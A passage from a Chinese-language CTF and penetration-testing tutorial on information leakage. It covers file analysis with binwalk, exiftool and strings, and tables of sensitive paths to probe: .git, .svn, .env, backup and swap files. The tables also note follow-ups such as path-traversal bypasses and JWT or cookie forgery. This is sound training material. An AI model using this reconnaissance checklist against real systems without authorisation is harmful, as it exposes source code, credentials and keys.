binwalk 文件名                      # 列出文件中嵌入了什么
binwalk -Me 文件名                   # 递归提取所有嵌套文件
```

### 实战：exiftool —— 查看元数据

```bash
exiftool 文件名                      # 查看所有元数据
exiftool 文件名 | grep -i flag       # 搜元数据中的 flag
exiftool 文件名 | grep -i "comment|description|author"  # 关注注释字段
```

### 典型 CTF 场景速查

| 场景 | 操作 | 说明 |
|------|------|------|
| 下载了 `backup.bak` | `file backup.bak` → SQLite → `strings \| grep flag` | 99% 的 SQLite 里都能直接搜到 flag |
| 下载了 `source.tar.gz` | `tar -xzf source.tar.gz` 解压 | 注意检查 tar.gz、tar.bz2、zip 等 |
| 下载了 `image.png` | `strings image.png \| grep flag` | 图片里可能藏了文本 |
| 下载了无后缀文件 | `file 文件` 识别类型 → 改后缀解压 | 最常见情况 |
| 固件分析 | `binwalk -Me firmware.bin` 自动提取 | 固件里可能有多层嵌套 |
| PHP 文件被解析 | `curl -O` 下载后用编辑器查看 | 不要用浏览器打开，会被执行 |

| 1.1 敏感目录 | 目录遍历 | `robots.txt`、`/admin`、`/backup` | 目录扫描工具 + 结果解读 |
| 1.2 目录穿越 | 任意文件读取 | `file=`、`path=`、`load=` | 编码绕过、双写、绝对路径 |
| 1.3 备份文件 | 源码泄露 | `.bak`、`.swp`、`.old`、`www.zip` | 后缀枚举、手动拼接 |
| 1.4 DVCS 泄露 | 完整源码泄露 | `/.git/HEAD`、`/.svn/entries` | GitHack / git-dumper / dvcs-ripper |
| 1.5 Vim 泄露 | 编辑器残留 | `.swp`、`.swo`、`.swn` | `vim -r` 恢复 / `strings` 提取 |
| 1.6 .DS_Store | 目录结构泄露 | `.DS_Store` | ds_store 库解析 / `strings` |
| 1.7 .env 泄露 | 密钥+密码泄露 | `/.env`、`APP_KEY`、`DB_PASSWORD` | Cookie伪造 / 远程连接 / JWT伪造 |
| 1.8 二进制查看 | 信息提取 | `file`、`strings`、`xxd` | 类型识别 / 字符串提取 / 嵌套文件分析 |

---

>**最后的忠告：** 信息泄露是渗透测试的"低垂果实"——它不需要复杂的漏洞利用技术，只需要耐心和细心。每次探测新目标时，先花 10 分钟检查本节列出的所有高价值路径，往往比直接上 SQLMap 更高效。记佳：** 别人看不见的，才是最有价值的。**
